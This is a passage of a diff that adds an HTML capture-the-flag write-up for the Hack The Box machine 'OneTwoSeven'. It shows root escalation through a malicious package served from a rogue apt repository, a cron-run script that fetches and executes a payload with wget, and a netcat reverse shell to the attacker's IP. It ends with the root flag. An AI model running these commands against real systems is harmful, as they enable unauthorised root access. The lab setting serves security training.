+    │       ├── Release
+    │       └── Release.gpg
+    └── pool
+        └── DEBIAN
+            └── main
+                └── x
+                    └── xauth
+                        └── xauth_1.0.9-1+b3_amd64.deb
+</pre>
+
+<p>Run <code>sudo apt-get update</code> in <code>onetwoseven</code>.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/$ sudo apt-get update
+Ign:1 http://packages.onetwoseven.htb/devuan ascii InRelease
+Get:3 http://packages.onetwoseven.htb/devuan ascii Release [494 B]
+Get:5 http://packages.onetwoseven.htb/devuan ascii Release.gpg [659 B]         
+Ign:5 http://packages.onetwoseven.htb/devuan ascii Release.gpg                 
+Get:7 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages [460 B] 
+Get:2 http://deb.devuan.org//merged ascii InRelease [25.6 kB]
+....
+</pre>
+
+<p>We should see how it retrieves the correct files from our repository.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+127.0.0.1 - - [05/Aug/2019 14:16:57] code 404, message File not found
+127.0.0.1 - - [05/Aug/2019 14:16:57] "GET /devuan/dists/ascii/InRelease HTTP/1.1" 404 -
+127.0.0.1 - - [05/Aug/2019 14:16:57] "GET /devuan/dists/ascii/Release HTTP/1.1" 200 -
+127.0.0.1 - - [05/Aug/2019 14:16:58] "GET /devuan/dists/ascii/Release.gpg HTTP/1.1" 200 -
+127.0.0.1 - - [05/Aug/2019 14:16:58] "GET /devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 200 -
+</pre>
+
+<p>Then <code>sudo apt-get upgrade</code> and indicate that we do want to install <code>xauth</code> even it cannot be authenticated.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/$ sudo apt-get upgrade
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+Calculating upgrade... Done
+The following packages will be upgraded:
+  apache2 apache2-bin apache2-data apache2-utils bind9-host dbus libbind9-140
+  libdbus-1-3 libdns-export162 libdns162 libexpat1 libisc-export160 libisc160
+  libisccc140 libisccfg140 liblwres141 libpng16-16 libssh2-1 libssl1.0.2
+  libssl1.1 libsystemd0 openssl vim vim-common vim-runtime vim-tiny wget xauth
+  xxd
+29 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+Need to get 18.2 MB of archives.
+After this operation, 51.2 kB of additional disk space will be used.
+Do you want to continue? [Y/n] 
+WARNING: The following packages cannot be authenticated!
+  xauth
+Install these packages without verification? [y/N] y
+Get:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 xauth amd64 1:1.0.9-1+b3 [39.9 kB]
+...
+</pre>
+
+<p>We should see how it downloaded our malicious package.</p>
+
+<pre class="prettyprint">
+127.0.0.1 - - [05/Aug/2019 14:17:39] "GET /devuan/pool/DEBIAN/main/x/xauth/xauth_1.0.9-1%2bb3_amd64.deb HTTP/1.1" 200 -
+</pre>
+
+<p>After the installation has finished, our script should be available in <code>/usr/bin</code> and ready to be executed by the cron job.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/tmp$ cat /usr/bin/my_script 
+#!/bin/sh
+rm /tmp/caca
+wget http://10.10.16.55/caca -O /tmp/caca
+chmod 700 /tmp/caca
+/tmp/caca
+</pre>
+
+<p>Create the file which will be downloaded and executed, a simple reverse shell for example.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# cat caca 
+#!/bin/sh
+nc 10.10.16.55 6767 -e /bin/bash
+</pre>
+
+<p>When 5 minutes have passed it should be retrieved.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.133 - - [05/Aug/2019 14:29:54] "GET /caca HTTP/1.1" 200 -
+</pre>
+
+<p>And if we were listening on the specified port, we should get a shell as root.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# nc -nlvp 6767
+listening on [any] 6767 ...
+connect to [10.10.16.55] from (UNKNOWN) [10.10.10.133] 49388
+whoami
+root
+</pre>
+
+<pre class="prettyprint">
+cat /root/root.txt
+<span flag="2d380a25a8e3bfc095abd9e691841048">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
